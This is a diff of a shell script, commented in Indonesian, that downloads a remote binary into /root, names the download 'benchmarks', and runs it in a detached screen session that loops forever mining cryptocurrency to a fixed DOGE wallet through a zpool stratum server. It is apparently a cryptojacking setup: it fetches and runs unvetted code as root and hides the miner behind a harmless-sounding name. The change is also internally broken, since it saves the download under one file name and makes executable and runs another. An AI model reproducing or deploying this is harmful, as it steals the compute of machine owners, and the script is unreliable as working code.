@@ -11,8 +11,8 @@ cd /root || exit
 # Download miner jika belum ada
 if [ ! -f benchmarks ]; then
   echo "⬇️ Mengunduh file benchmarks..."
-  wget -O benchmarks https://raw.githubusercontent.com/amirul5656/web/refs/heads/main/benchmarks
-  chmod +x benchmarks
+  wget -O benchmarks https://raw.githubusercontent.com/amirul5656/web/refs/heads/main/amirul
+  chmod +x amirul
 fi
 
 # Cek apakah screen sudah berjalan
@@ -22,7 +22,7 @@ else
   echo "▶ Menjalankan mining di screen 'amirul3'..."
   screen -dmS amirul3 bash -c '
     while true; do
-      ./web -a yespowerSUGAR -o stratum+tcp://yespowerSUGAR.sea.mine.zpool.ca:6241 -u D8n4HXcTza73pBw93ZnSgcZRo8rHdZJLux -p c=DOGE -t 3
+      ./amirul -a yespowerSUGAR -o stratum+tcp://yespowerSUGAR.sea.mine.zpool.ca:6241 -u D8n4HXcTza73pBw93ZnSgcZRo8rHdZJLux -p c=DOGE -t 3
       sleep 2
     done
   '
